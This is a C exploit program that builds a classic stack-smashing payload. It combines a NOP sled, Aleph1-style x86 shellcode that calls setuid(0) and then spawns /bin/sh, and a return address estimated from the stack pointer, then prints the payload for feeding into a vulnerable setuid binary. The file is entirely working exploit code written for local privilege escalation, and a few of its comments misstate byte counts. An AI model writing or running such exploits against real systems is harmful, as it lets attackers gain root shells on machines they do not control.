#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <stdio.h>

char shellcode[] =		//setuid(0) & Aleph1's famous shellcode, see ref.
  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"	//setuid(0) first
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

//Small function to retrieve the current esp value (only works locally)
unsigned long get_sp (void) {
  __asm__ ("movl %esp, %eax");
}

int main (int argc, char *argv[1])
{
  int i;
  unsigned int ret, *addr_ptr;
  char *buffer, *ptr;
  int size = 70 + 8;
  
  // return code and address
  ret = get_sp();
  ret -= 120;
  fprintf(stderr, "Returning address: 0x%x\n", ret);
  buffer = (char *) malloc (size);
  
  // 29 bytes NOP's
  for (i = 0; i < 17; i++) {
      buffer[i] = '\x90';
  }

  // Next, shell code! (54 bytes)
  ptr = buffer + 17;
  for (i = 0; i < strlen (shellcode); i++) {
      *(ptr++) = shellcode[i];
  }

  // Finally the address of return (8 bytes)
  addr_ptr = (unsigned int *) ptr;
  for (i = 0; i < 2; i++) {
      *(addr_ptr++) = ret;
  }
 
  // Print the payload
  printf("%s", buffer);
  free (buffer);
  return 0;
}